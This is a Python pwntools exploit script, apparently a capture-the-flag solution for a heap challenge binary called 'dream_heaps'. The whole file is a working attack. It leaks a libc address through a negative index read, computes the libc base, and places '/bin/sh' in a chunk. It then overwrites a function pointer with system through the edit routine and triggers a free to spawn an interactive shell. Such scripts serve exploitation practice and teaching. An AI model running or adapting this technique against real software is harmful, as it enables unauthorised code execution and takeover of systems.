from pwn import *

gdbcmds = '''
b *main+196
b *edit_dream+137
b *main+201
r
'''

elf = context.binary = ELF('./dream_heaps')
libc = elf.libc
#target = process('./dream_heaps')
target = gdb.debug('./dream_heaps', gdbscript=gdbcmds)

def write(message, length):
    target.recvuntil(b">")
    target.sendline(b"1")
    target.recvuntil(b"?")
    target.sendline(length)
    target.recvuntil(b"?")
    target.sendline(message)

def read(idx):
    target.recvuntil(b">")
    target.sendline(b"2")
    target.recvuntil(b"?")
    target.sendline(idx)
    leak = target.recvuntil(b"What")
    leak = leak.replace(b"What", b"")
    leak = leak.replace(b"\x0a", b"")
    leak += (8-len(leak))*b"\x00"
    leak = u64(leak)
    return leak


def edit(message, idx):
    target.recvuntil(b">")
    target.sendline(b"3")
    target.recvuntil(b"?")
    target.sendline(idx)
    target.send(message)


def delete(idx):
    target.recvuntil(b">")
    target.sendline(b"4")
    target.recvuntil(b"?")
    target.sendline(idx)

leak = read(b"-263021") # leaks puts
base = leak - libc.symbols['puts'] 
print("Leak:", hex(leak))
print("Base:", hex(base))

write(b'/bin/sh\x00', b'16')
write(b'0'*10, b'32')
write(b'0'*10, b'48')
write(b'0'*10, b'64')
write(b'0'*10, b'80')
write(b'0'*10, b'96')
write(b'0'*10, b'112')
write(b'0'*10, b'128')
write(b'0'*10, b'144')
write(b'0'*10, b'160')
write(b'0'*10, b'176')
write(b'0'*10, b'192')
write(b'0'*10, b'208')
write(b'0'*10, b'224')
write(b'0'*10, b'240')
write(b'0'*10, b'17')
write(b'0'*10, b'34')
write(b'0'*10, b'24')
write(b'0'*10, b'6299672')
write(b'0'*10, b'00')

sys = p64(base + libc.symbols['system'])
edit(sys, b"17")

delete(b'0')

target.interactive()
